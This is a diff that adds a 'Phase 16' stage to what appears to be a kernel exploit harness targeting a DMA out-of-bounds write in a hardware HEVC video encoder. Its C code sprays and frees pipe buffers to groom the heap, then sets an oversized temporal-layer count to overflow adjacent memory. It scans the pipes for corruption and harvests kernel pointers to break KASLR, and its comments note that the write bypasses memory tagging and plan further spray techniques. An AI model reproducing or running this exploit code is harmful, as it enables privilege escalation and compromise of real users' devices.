@@ -21704,6 +21704,274 @@ new_modes:
         }
 
 
+        /* ================================================================
+         * Phase 16 (r=229): AVE Temporal Layer DMA Overflow
+         *
+         * CVE-2026-112705: DMA mapping loop at AVE2+0x13e2e8 iterates
+         * iNumOfTemporalLayer times. Buffer sized for <=8 layers.
+         * With NTL=9+, DMA OOB write occurs.
+         *
+         * CRITICAL: DMA bypasses MTE! Coprocessor memory bus has no tag
+         * checks. This is the Calif.io approach (data-only LPE).
+         *
+         * Strategy:
+         * 1. Spray pipe buffers (various sizes)
+         * 2. Create holes
+         * 3. Create HEVC encoder with NTL=9..12 (small overflow)
+         * 4. Encode frames - DMA overflow into adjacent allocations
+         * 5. Check pipes for corruption
+         *
+         * Unlike VPS overflow (CVE-2026-114025) which needs encoder to
+         * produce VPS output, the DMA mapping loop runs BEFORE encode
+         * output, so even a failed encode may trigger the overflow.
+         * ================================================================ */
+        if (rounds == 229) {
+            rlog("\n=== Phase 16 (r=229): AVE Temporal Layer DMA Overflow ===\n");
+            rlog("Target: CVE-2026-112705 via NumberOfTemporalLayers OOB\n");
+            rlog("DMA bypasses MTE - no tag checks on coprocessor bus\n");
+
+            int p16_total_corrupted = 0;
+            uint64_t p16_leaked_ptr = 0;
+
+            /* Try multiple NTL values: 9 (min overflow), 10, 12 */
+            int ntl_values[] = {9, 10, 12};
+            int n_ntl = sizeof(ntl_values) / sizeof(ntl_values[0]);
+
+            /* Also try different pipe sizes to target different zones */
+            int pipe_sizes[] = {512, 1024, 4096};
+            int n_psizes = sizeof(pipe_sizes) / sizeof(pipe_sizes[0]);
+
+            for (int ni = 0; ni < n_ntl && !p16_total_corrupted; ni++) {
+                int ntl = ntl_values[ni];
+
+                for (int pi = 0; pi < n_psizes && !p16_total_corrupted; pi++) {
+                    int psize = pipe_sizes[pi];
+                    rlog("\n  --- NTL=%d, pipe=%d bytes ---\n", ntl, psize);
+
+                    /* 16a: Spray pipe buffers */
+                    #define P16_NPIPES 100
+                    int p16_fds[P16_NPIPES][2];
+                    int p16_ok = 0;
+                    uint8_t *p16_buf = (uint8_t *)malloc(psize);
+
+                    for (int i = 0; i < P16_NPIPES; i++) {
+                        p16_fds[i][0] = p16_fds[i][1] = -1;
+                        if (pipe(p16_fds[i]) == 0) {
+                            uint32_t pat = 0xBE5E0000u | (uint16_t)i;
+                            for (int j = 0; j < psize / 4; j++)
+                                ((uint32_t *)p16_buf)[j] = pat ^ (uint32_t)j;
+                            ssize_t w = write(p16_fds[i][1], p16_buf, psize);
+                            if (w == psize) p16_ok++;
+                            else {
+                                close(p16_fds[i][0]); close(p16_fds[i][1]);
+                                p16_fds[i][0] = p16_fds[i][1] = -1;
+                            }
+                        }
+                    }
+                    rlog("  16a: %d/%d pipes\n", p16_ok, P16_NPIPES);
+
+                    /* 16b: Create holes every 3rd pipe */
+                    int p16_freed = 0;
+                    for (int i = 2; i < P16_NPIPES; i += 3) {
+                        if (p16_fds[i][0] >= 0) {
+                            close(p16_fds[i][0]); close(p16_fds[i][1]);
+                            p16_fds[i][0] = p16_fds[i][1] = -1;
+                            p16_freed++;
+                        }
+                    }
+                    rlog("  16b: Freed %d holes\n", p16_freed);
+
+                    /* 16c: Create regular HEVC encoder with high NTL */
+                    VTCompressionSessionRef p16_enc = NULL;
+                    CFMutableDictionaryRef p16_spec = CFDictionaryCreateMutable(NULL, 0,
+                        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+                    CFDictionarySetValue(p16_spec,
+                        CFSTR("EnableHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
+                    CFDictionarySetValue(p16_spec,
+                        CFSTR("RequireHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
+
+                    OSStatus p16_st = VTCompressionSessionCreate(NULL, 192, 192,
+                        kCMVideoCodecType_HEVC, p16_spec, NULL, NULL,
+                        encode_cb, NULL, &p16_enc);
+                    CFRelease(p16_spec);
+                    rlog("  16c: HEVC session: %d\n", (int)p16_st);
+
+                    if (p16_st != noErr || !p16_enc) {
+                        rlog("  SKIP\n");
+                        goto p16_cleanup;
+                    }
+
+                    VTSessionSetProperty(p16_enc,
+                        kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
+
+                    /* Set NumberOfTemporalLayers past the 8-layer limit */
+                    CFNumberRef p16_ntl = CFNumberCreate(NULL, kCFNumberIntType, &ntl);
+                    OSStatus sp = VTSessionSetProperty(p16_enc,
+                        CFSTR("NumberOfTemporalLayers"), p16_ntl);
+                    CFRelease(p16_ntl);
+                    rlog("  NTL=%d: %d\n", ntl, (int)sp);
+
+                    if (sp != noErr) {
+                        rlog("  NTL rejected!\n");
+                        VTCompressionSessionInvalidate(p16_enc);
+                        CFRelease(p16_enc);
+                        goto p16_cleanup;
+                    }
+
+                    OSStatus prep = VTCompressionSessionPrepareToEncodeFrames(p16_enc);
+                    rlog("  Prepare: %d\n", (int)prep);
+
+                    if (prep != noErr) {
+                        VTCompressionSessionInvalidate(p16_enc);
+                        CFRelease(p16_enc);
+                        goto p16_cleanup;
+                    }
+
+                    /* 16d: Encode multiple frames to trigger DMA overflow.
+                     * Force keyframes to ensure full surface creation. */
+                    int enc_ok = 0, enc_err = 0;
+                    for (int ei = 0; ei < 10; ei++) {
+                        g_encode_done = 0;
+                        g_cb_status = -999;
+
+                        CVPixelBufferRef pb = NULL;
+                        CVPixelBufferCreate(NULL, 192, 192,
+                            kCVPixelFormatType_32BGRA, NULL, &pb);
+                        if (!pb) continue;
+                        CVPixelBufferLockBaseAddress(pb, 0);
+                        void *b = CVPixelBufferGetBaseAddress(pb);
+                        if (b) memset(b, (uint8_t)(ei * 13 + 0x55),
+                            CVPixelBufferGetDataSize(pb));
+                        CVPixelBufferUnlockBaseAddress(pb, 0);
+
+                        CFMutableDictionaryRef fp = NULL;
+                        if (ei % 3 == 0) {
+                            fp = CFDictionaryCreateMutable(NULL, 0,
+                                &kCFTypeDictionaryKeyCallBacks,
+                                &kCFTypeDictionaryValueCallBacks);
+                            CFDictionarySetValue(fp,
+                                kVTEncodeFrameOptionKey_ForceKeyFrame,
+                                kCFBooleanTrue);
+                        }
+
+                        OSStatus est = VTCompressionSessionEncodeFrame(p16_enc,
+                            pb, CMTimeMake(ei, 30), kCMTimeInvalid,
+                            fp, NULL, NULL);
+                        if (fp) CFRelease(fp);
+                        CVPixelBufferRelease(pb);
+
+                        /* Wait for callback (max 2s) */
+                        for (int w = 0; w < 200 && !g_encode_done; w++)
+                            usleep(10000);
+
+                        if (g_cb_status == 0) enc_ok++;
+                        else enc_err++;
+
+                        if (ei < 3 || enc_ok > 0)
+                            rlog("  enc[%d]: st=%d cb=%d\n", ei,
+                                (int)est, (int)g_cb_status);
+                    }
+                    rlog("  16d: ok=%d err=%d\n", enc_ok, enc_err);
+
+                    VTCompressionSessionInvalidate(p16_enc);
+                    CFRelease(p16_enc);
+                    usleep(200000); /* Let DMA settle */
+
+                    /* 16e: Check pipes for corruption */
+                    int p16_checked = 0, p16_corrupted = 0;
+                    for (int i = 0; i < P16_NPIPES; i++) {
+                        if (p16_fds[i][0] < 0) continue;
+                        p16_checked++;
+
+                        uint8_t *rb = (uint8_t *)malloc(psize);
+                        ssize_t r = read(p16_fds[i][0], rb, psize);
+
+                        if (r != psize) {
+                            p16_corrupted++;
+                            rlog("  *** PIPE[%d] short read %zd ***\n", i, r);
+                        } else {
+                            uint32_t expected = 0xBE5E0000u | (uint16_t)i;
+                            int mm = 0;
+                            int first_off = -1;
+                            uint32_t first_got = 0;
+
+                            for (int j = 0; j < psize / 4; j++) {
+                                uint32_t exp_j = expected ^ (uint32_t)j;
+                                uint32_t got;
+                                memcpy(&got, rb + j * 4, 4);
+                                if (got != exp_j) {
+                                    if (mm == 0) {
+                                        first_off = j * 4;
+                                        first_got = got;
+                                    }
+                                    mm++;
+                                }
+                            }
+
+                            if (mm > 0) {
+                                p16_corrupted++;
+                                rlog("  *** PIPE[%d] CORRUPTED: %d dwords at +%d: 0x%08x ***\n",
+                                    i, mm, first_off, first_got);
+
+                                /* Scan for kernel pointers */
+                                for (int q = 0; q < psize / 8; q++) {
+                                    uint64_t qw;
+                                    memcpy(&qw, rb + q * 8, 8);
+                                    if ((qw >> 40) == 0xfffffe) {
+                                        rlog("    KPTR at +%d: 0x%016llx\n",
+                                            q * 8, (unsigned long long)qw);
+                                        if (p16_leaked_ptr == 0) p16_leaked_ptr = qw;
+                                    }
+                                }
+
+                                /* Hex dump at corruption */
+                                int ds = (first_off > 16) ? first_off - 16 : 0;
+                                int de = first_off + 64;
+                                if (de > psize) de = psize;
+                                for (int d = ds; d < de; d += 16) {
+                                    rlog("    %04x:", d);
+                                    for (int b = 0; b < 16 && d + b < de; b++)
+                                        rlog(" %02x", rb[d + b]);
+                                    rlog("\n");
+                                }
+                            }
+                        }
+                        free(rb);
+                    }
+                    rlog("  16e: checked=%d corrupted=%d\n", p16_checked, p16_corrupted);
+
+                    if (p16_corrupted > 0) {
+                        p16_total_corrupted = p16_corrupted;
+                        rlog("  *** DMA OVERFLOW -> PIPE CORRUPTION ***\n");
+                    }
+
+                    p16_cleanup:
+                    for (int i = 0; i < P16_NPIPES; i++) {
+                        if (p16_fds[i][0] >= 0) {
+                            close(p16_fds[i][0]); close(p16_fds[i][1]);
+                        }
+                    }
+                    free(p16_buf);
+                    #undef P16_NPIPES
+                }
+            }
+
+            if (p16_total_corrupted > 0) {
+                rlog("\n*** Phase 16: DMA OVERFLOW CONFIRMED ***\n");
+                if (p16_leaked_ptr)
+                    rlog("*** KASLR LEAK: 0x%016llx ***\n",
+                        (unsigned long long)p16_leaked_ptr);
+            } else {
+                rlog("\n  Phase 16: No pipe corruption from NTL overflow.\n");
+                rlog("  DMA buffers may be in IOKit typed zone, not kalloc.data.\n");
+                rlog("  Next: try OOL mach msg spray or IOSurface re-spray.\n");
+            }
+
+            rlog("--- Phase 16 (DMA overflow) complete ---\n");
+        }
+
+
+
         /*
          * Phase 15: Structure offset crash oracle
          *
